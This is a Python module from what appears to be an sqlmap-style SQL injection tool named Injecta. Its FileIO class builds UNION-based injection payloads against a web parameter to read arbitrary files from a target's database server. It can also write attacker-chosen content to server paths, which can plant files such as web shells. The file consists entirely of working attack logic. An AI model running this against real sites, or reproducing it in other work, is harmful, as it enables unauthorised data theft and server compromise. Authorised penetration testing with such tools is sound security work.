"""
Injecta — File I/O operations (sqlmap-style)
"""
import re
from typing import Any, Dict, List, Tuple
from injecta.enum.extract import build_union_payload, extract_orig_val, MARKER


class FileIO:
    def __init__(self, requester, config, logger, payloads, injection_info: Dict[str, Any]):
        self.req = requester
        self.config = config
        self.log = logger
        self.payloads = payloads
        self.info = injection_info
        self.dbms = getattr(payloads, "name", "") if payloads else ""

    def _get_params(self, url: str, param: str):
        cols = self.info.get("column_count", 1) if self.info else 1
        pos = self.info.get("data_pos", 1) if self.info else 1
        orig_val = extract_orig_val(url, param)
        return cols, pos, orig_val

    def read(self, url: str, param: str, path: str) -> List[str]:
        queries = self.payloads.file_read(path)
        cols, pos, orig_val = self._get_params(url, param)

        for q in queries:
            payload = build_union_payload(q, cols, pos, MARKER, self.dbms, orig_val)
            result = self._try_extract(url, param, payload)
            if result:
                return result
        return []

    def write(self, url: str, param: str, path: str, content: str = "") -> bool:
        queries = self.payloads.file_write(path, content)
        cols, pos, orig_val = self._get_params(url, param)

        for q in queries:
            payload = build_union_payload(q, cols, pos, MARKER, self.dbms, orig_val)
            result = self._try_write(url, param, payload)
            if result:
                return True
        return False

    def _try_extract(self, url: str, param: str, payload: str) -> list:
        try:
            _, resp_text, _ = self.req.test_raw(url, payload, param)
        except:
            return []
        if not resp_text or len(resp_text) < 50:
            return []
        vals = re.findall(r'([\w/\-.,:;@#$%^&*()\[\]{}<>?\\|~`\'"! ]{4,200})', resp_text)
        if vals:
            return vals[:20]
        return []

    def _try_write(self, url: str, param: str, payload: str) -> bool:
        try:
            _, resp_text, _ = self.req.test_raw(url, payload, param)
        except:
            return False
        if not resp_text:
            return False
        error_words = ['permission denied', 'access denied', 'cannot', 'failed', 'error reading file']
        for ew in error_words:
            if ew in resp_text[:1000].lower():
                return False
        return True
